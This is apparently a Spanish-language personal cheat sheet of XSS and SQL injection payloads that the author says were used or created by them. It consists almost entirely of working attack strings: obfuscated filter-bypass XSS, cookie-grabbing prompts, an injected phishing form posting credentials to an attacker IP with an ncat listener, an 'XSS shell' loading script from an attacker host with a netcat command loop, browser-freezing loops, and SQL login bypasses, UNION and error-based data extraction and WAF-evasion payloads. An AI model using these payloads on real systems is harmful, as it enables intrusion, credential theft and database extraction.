# Recopilación de todos los Payloads usados / creados por mi.


### Para detectar errores: sql inyection, xss inyection y HTML inyection

`'"><script>alert`1`</script><h1>d</h1>`

### h1

```
<h1 onclick=\u0041\u006cert("_Y000!_")>Y00</h1>

<a onclick=\u0041\u006cert("_Y000!_")>Y00</a>

<p onclick=\u0041\u006cert("_Y000!_")>Y00</p>

<marquee onclick=\u0041\u006cert("_Y000!_")>Y00</marquee>

```

### onMouseOver

```
onMouseOver=<script>alert("/XSS BY Y000!/")</script>

</script><h1 onmouseover= top[8680439..toString(30)]("_Y000!_")>

</script><h1 onmouseover=top[/al/.source+/ert/.source]("_Y000!_")>

</script><h1 onmouseover=["_Y000!_"].find(alert)>

</script><h1 onmouseover= (((confirm)))`_Y000!_`>
```

### input + onblur + Obfuscation

```

<input onblur=top[/al/.source+/ert/.source]("_Y00!_") autofocus><input autofocus>

<input onblur=["_Y00!_"].find(alert) autofocus><input autofocus>

<input onblur=(((confirm)))("_Y00!_") autofocus><input autofocus>

```
### html + onclik + Alert Obfuscation

```
<p/onclick=%27new%20Function`al\ert\`\u0059\u0030\u0030\u0030\``%27>d

<p/onclick=self[`aler`%2b`t`]`\u0059\u0030\u0030\u0030`>d
```

### Xss dentro de un botón en form:

`<form><button formaction=javascript&colon;alert('xss_by_Y000!')>_Y000!_`

`<marquee><form><button formacti\u006fn=javascript&colon;pr\u006fmpt('xss_by_Y000!')>_Y000!_</marquee>`

### fake captcha 

`<img/src=%27https://i.imgur.com/kkum7k2.jpg%27%20onmouseover=prompt("_Y000!_")`

### Img + Onerror

`<Img src="/" =_=" title=" onerror='prompt(document.cookie)'">`


### marcas


```
<marquee direction="down" width="250" height="200" behavior="alternate" style="border:solid">
  <marquee behavior="alternate">
    Xss by Y000
  </marquee>
 <marquee behavior="alternate">
    Y000
  </marquee>
</marquee>
```


### Marquee + alert

`<marquee loop=1 width=0 onfinish=pr\u006fmpt(document.cookie)>Y000</marquee>`



### onload / onfocus

```
"onfocus="alert('Y000')"+autofocus="

</script><!--><svg onload=[document.domain].find%26%2340;alert%26rpar;>

"><svg/onload=alert`${'000'}¥000!.was.here$`>

<svg/onload=eval("ale"+"rt")(`✓${alert`✓`}`)>

```

### noscript

`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`


### redirección 

`"><script>document.location="http://google.com";</script>`


### JavaScript

`<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydGBZMDAwYDwvc2NyaXB0Pg=='></object>`

### document.write + iframe

`<img src="x" onerror="document.write('<iframe src=tu_phishing></iframe>')"/>`


### xss + Unicode

`<marquee loop=1 width=0 onfinish=\u0070\u0072\u006f\u006d\u0070\u0074(document.cookie)>Y000</marquee>`


### ontoggle

`"><details/open/ontoggle=confirm`/xss_by_Y000!/`>`

### XSSDoS

```
<script> for(;;) alert("_Y000!_")</script>
<meta%20http-equiv="refresh"%20content="0;">
"  autofocus '-->--!><Input/Autofocus/*/Onfocus=document.location=``;alert`_Y000!_`//>
```

### Filter Bypass Alert Obfuscation
 ```
(alert)(1)
a=alert,a(1)
[1].find(alert)
top[“al”+”ert”](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top[‘al\145rt’](1)
top[‘al\x65rt’](1)
top[8680439..toString(30)](1)

confirm()
confirm``
(confirm``)
{confirm``}
[confirm``]
(((confirm)))``
co\u006efirm()
new class extends confirm``{}
[8].find(confirm)
[8].map(confirm)
[8].some(confirm)
[8].every(confirm)
[8].filter(confirm)
[8].findIndex(confirm)

self[`aler`%2b`t`]`1`
'new Function`al\ert\`1\``'
'new Function`pro\mpt\`1\``'

alert(document['cookie']) 
with(document)alert(cookie) 
eval('ale'+'rt(1)')window['alert'](0)
parent['alert'](1)
self['alert'](2)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[12].forEach(alert);
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;

alert.call(null, document.domain);
[document.domain].forEach(alert);
alert.apply(null, [document.domain]);
alert.bind()(document.domain);
alert(this['document']['domain']);
(new Map()).set(1, document.domain).forEach(alert);






```


### ----------------------------------

## HTML para simular un phishing y conseguir datos por ncat


### payload a inyectar:
```
<h3>Registrate</h3>
<form action=http://<Ip>:<Puerto>>Usuario:
<br><input type="username" name="username">
</br>Contraseña:<br><input type="password" name="password"></br>
<br><input type="submit" value="Entrar"></br>

```

### para escuchar:
`ncat -lnvp puerto`



## xss shell

### payload a inyectar:
```
"><script>setInterval(function(){d=document;z=d.createElement("script");z.src="//IP:PORT";d.body.appendChild(z)},0)</script>
```

### para escuchar:
```
while :; do printf "Y000>$ "; read c; echo $c | nc -vvlp PORT >/dev/null; done
```
### eventos 

```
<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onafterprint="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onbeforeprint="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onbeforeunload="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onerror="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onhashchange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmessage="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ononline="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onoffline="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpagehide="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpageshow="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpopstate="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onresize="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onstorage="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onunload="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onblur="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onchange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncontextmenu="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oninput="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oninvalid="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onreset="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onsearch="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onselect="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onsubmit="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onkeydown="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onkeypress="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onkeyup="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onclick="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondblclick="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmousedown="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmousemove="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmouseout="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmouseover="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmouseup="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmousewheel="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onwheel="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondrag="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragend="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragenter="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragleave="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragover="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragstart="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondrop="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onscroll="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncopy="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncut="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpaste="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onabort="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncanplay="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncanplaythrough="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncuechange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondurationchange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onemptied="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onended="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onerror="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onloadeddata="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onloadedmetadata="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onloadstart="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpause="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onplay="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onplaying="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onprogress="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onratechange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onseeked="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onseeking="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onstalled="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onsuspend="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ontimeupdate="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onvolumechange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onwaiting="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onshow="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ontoggle="alert(String.fromCharCode(88,83,83))">

```

# xss en android 

```
<html ontouchstart=alert(1)>
<html ontouchend=alert(1)>
<html ontouchmove=alert(1)>
<html ontouchcancel=alert(1)>
<body onorientationchange=alert(1)>
<svg onload=alert(navigator.connection.type)>

```

## xss en android para iniciar llamada y enviar mensajes de texto:

```
onclick="window.location.href='tel:00000000000';"

window.open ("sms:[00000000000]?body=" + "mensaje","_system");

```







## xss javascript navigator  

```
<svg onload=alert(navigator.appCodeName)>
<svg onload=alert(navigator.appName)>
<svg onload=alert(navigator.appVersion)>
<svg onload=alert(navigator.cookieEnabled)>
<svg onload=alert(navigator.language)>
<svg onload=alert(navigator.onLine)>
<svg onload=alert(navigator.platform)>
<svg onload=alert(navigator.userAgent)>


```



Muchos mas:

```
<script%20~~~>\u0061\u006C\u0065\u0072\u0074``</script%20~~~>
<\x3Cscript>javascript:alert(1)</script>
'`"><\x00script>javascript:alert(1)</script>
<img src=1 href=1 onerror="javascript:alert(1)"></img>
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
<video src=1 href=1 onerror="javascript:alert(1)"></video> 
<body src=1 href=1 onerror="javascript:alert(1)"></body>
<image src=1 href=1 onerror="javascript:alert(1)"></image>
<object src=1 href=1 onerror="javascript:alert(1)"></object>
<script src=1 href=1 onerror="javascript:alert(1)"></script> 
<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange> <iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad> 
<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter> 
<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll> 
<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)">
</body onPropertyChange> <svg onLoad svg onLoad="javascript:javascript:alert(1)">
</svg onLoad> <body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide> 
<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver> 
<body onUnload body onUnload="javascript:javascript:alert(1)">
```




# sql injection 

## Payloads para sql inyection login bypass

```
' or ''-'
" or ""-"
" or true--
' or true--
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
```

## Ejemplos de payloads sql injection

### Detectar un error sql 
```
' = %27
" = %22
# = %23
; = %3B
```

### Detectar numero de columnas vulnerables 
```
 ORDER BY 1-- 
 ORDER BY 2-- 
 ORDER BY 3-- 
 ORDER BY 4-- 
 ORDER BY 5-- 
 ORDER BY 6-- 
 ORDER BY 7-- 
 ORDER BY 8-- 
 ORDER BY 9-- 
 ORDER BY 10-- 
 
 ORDER BY 1# 
 ORDER BY 2# 
 ORDER BY 3# 
 ORDER BY 4# 
 ORDER BY 5# 
 ORDER BY 6# 
 ORDER BY 7# 
 ORDER BY 8# 
 ORDER BY 9# 
 ORDER BY 10# 

```

### Union Select Payloads

```
 UNION SELECT 1
 UNION SELECT 1,2
 UNION SELECT 1,2,3
 UNION SELECT 1,2,3,4
 UNION SELECT 1,2,3,4,5
 UNION SELECT 1,2,3,4,5,6
 UNION SELECT 1,2,3,4,5,6,7

 UNION ALL SELECT 1
 UNION ALL SELECT 1,2
 UNION ALL SELECT 1,2,3
 UNION ALL SELECT 1,2,3,4
 UNION ALL SELECT 1,2,3,4,5
 UNION ALL SELECT 1,2,3,4,5,6
 UNION ALL SELECT 1,2,3,4,5,6,7
 
 UNION(SELECT 1)
 UNION(SELECT 1,2)
 UNION(SELECT 1,2,3)
 UNION(SELECT 1,2,3,4)
 UNION(SELECT 1,2,3,4,5)
 UNION(SELECT 1,2,3,4,5,6)
 UNION(SELECT 1,2,3,4,5,6,7)
 
 UNION ALL(SELECT 1)
 UNION ALL(SELECT 1,2)
 UNION ALL(SELECT 1,2,3)
 UNION ALL(SELECT 1,2,3,4)
 UNION ALL(SELECT 1,2,3,4,5)
 UNION ALL(SELECT 1,2,3,4,5,6)
 UNION ALL(SELECT 1,2,3,4,5,6,7)
 
 AND 1 UNION SELECT 1
 AND 1 UNION SELECT 1,2
 AND 1 UNION SELECT 1,2,3
 AND 1 UNION SELECT 1,2,3,4
 AND 1 UNION SELECT 1,2,3,4,5
 AND 1 UNION SELECT 1,2,3,4,5,6
 AND 1 UNION SELECT 1,2,3,4,5,6,7


```

### Union Select + sleep() + BENCHMARK(1000000,MD5('A')) Payloads

```
 UNION SELECT @@VERSION,SLEEP(5),3
 UNION SELECT @@VERSION,SLEEP(5),USER(),4
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8
 
```

### tecnicas para hacer bypass en sql inyection 

#### bypass usando comentarios
```
 /*!UNION*/ /*!SELECT*/ 1
 /*!UNION*/ /*!SELECT*/ 1,2
 /*!UNION*/ /*!SELECT*/ 1,2,3
 /*!UNION*/ /*!SELECT*/ 1,2,3,4
 /*!UNION*/ /*!SELECT*/ 1,2,3,4,5
 /*!UNION*/ /*!SELECT*/ 1,2,3,4,5,6
 /*!UNION*/ /*!SELECT*/ 1,2,3,4,5,6,7
 
 /*!12345UNION*/ /*!12345SELECT*/ 1
 /*!12345UNION*/ /*!12345SELECT*/ 1,2
 /*!12345UNION*/ /*!12345SELECT*/ 1,2,3
 /*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4
 /*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5
 /*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5,6
 /*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5,6,7
 
 /*!12345UNION*/(/*!12345SELECT*/ 1)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2,3)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5,6)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5,6,7)

```
#### bypass usando comentarios + url encoding 
```
 /*!%55nion*/%20/*!%53elect*/1
 /*!%55nion*/%20/*!%53elect*/%201,2
 /*!%55nion*/%20/*!%53elect*/%201,2,3
 /*!%55nion*/%20/*!%53elect*/%201,2,3,4
 /*!%55nion*/%20/*!%53elect*/%201,2,3,4,5
 /*!%55nion*/%20/*!%53elect*/%201,2,3,4,5,6
 /*!%55nion*/%20/*!%53elect*/%201,2,3,4,5,6,7
 
 /*!12345%55nion*/ /*!12345%53elect*/ 1
 /*!12345%55nion*/ /*!12345%53elect*/ 1,2
 /*!1234%55nion*/ /*!12345%53elect*/ 1,2,3
 /*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4
 /*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5
 /*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5,6
 /*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5,6,7
 
 /*!12345%55nion*/(/*!12345%53elect*/ 1)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5,6)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5,6,7)

```

### HTML URL Encode (Codificación Url)

```
union select:

u	= %75
n	= %6e
i	= %69
o	= %6f
n	= %6e
space	= %20
s	= %73
e	= %65
l	= %6c
c	= %63
t	= %74

```
### Sql payloads 

```
/**8**/and/**8**/0/**8**//*!50000union*//**8**//*!50000select*//**8**/+ numero de columnas +--+

+/*!50000%55nIoN*/+/*!50000%53eLeCt*/+

SELECT * FROM (SELECT count(*), CONCAT((SELECT database()), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y --

+uNiOn+(/*!/**/SeleCT*/+1,22,333...)+--+

%55%6e%49%6f%4e(/*!/**/%20SeleCT%20*/%2011,22,33,44,55,66,77,88,90,1010,1111,1212,1313,1414,1515,1616,1717,1818,1919....)

+/*✓*/UnIoN/*✓*/+/*✓*/AlL/*✓*/+(SeLeCt+1,2,3,%27soy%20vulnerable%27,5,6.....)+--+

+div+@a:=(current_user/**_**/())+UNION/**/DISTINCTROW+SELECT+1,2,@a,4+--+

%75nion/**)!*/sele%63%74/**)!*/+1,2,3....

/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4,5--

+union(select+1,2,3,4,concat(column_name),6,...+from+information_schema.columns+where+table_name=%22columna%22+limit+1,1)+--+

+union(select+1,2,3,database(),concat(hash,0x3a,hash),6..+from(columna))+--+



```

### Inyección sql tipo error based usando Extractvalue

`1%20and+extractvalue(rand(),concat(0x7e,version(),0x7e,user()))--`

### Sql inyection payload usando reverse

`reverse(right(reverse(data),1))`

### Sql inyection payload usando extractvalue:

`extractvalue(rand(),concat(CHAR(126),database(),CHAR(126)))`

### Sql inyection payload + url encode + timing  

`-7 %23%0AAND 0--%0A /*!12345UNION*/ /*!12345ALL*/ (/*!12345SELECT*/ 1,sleep(5),'soy vulnerable',BENCHMARK(1000000,MD5('true')),5,6,7,8,9,10,11,12,13)`

### Sql inyection + dios sql

```
/*!u%6eion*/ /*!se%6cect*/+1,concat(@:=0,(select count(*)from information_schema.columns where@:=concat(@,'<br>',table_name,'::',column_name)),@),3..

(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x)

CONCAT(Tablas <br>,(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=information_schema)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,table_name,0x3c62723e))))x))
```

### Sql inyection Buffer Overflow / Firewall Crash bypass + xss inyection

`+and+(select%201)=(Select%200xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa....)+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4,....+--+`

### sql inyection payload+ bypass Mod_Security 

```
+/*!50000un0x696fn*/+/*!12345AlL*/(/*!50000se0x6c65ct*/+1)+--+

/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4...

-1+/*!12345UnioN*//**/(/*!12345seLECT*//**/1)+--

```

### Sql inyection payload + comment + hex/unhex

`/*!50000select*/unhex(hex(/*!12345concat*/(0x223e,version(),0x223e,database())))`

### Sql inyection payload + url encode 

`+/*!12120%55%6e%49%6f%4e*/+(%53%65%4c%65%43%74+111,222,333,database(),555,...)+--+`




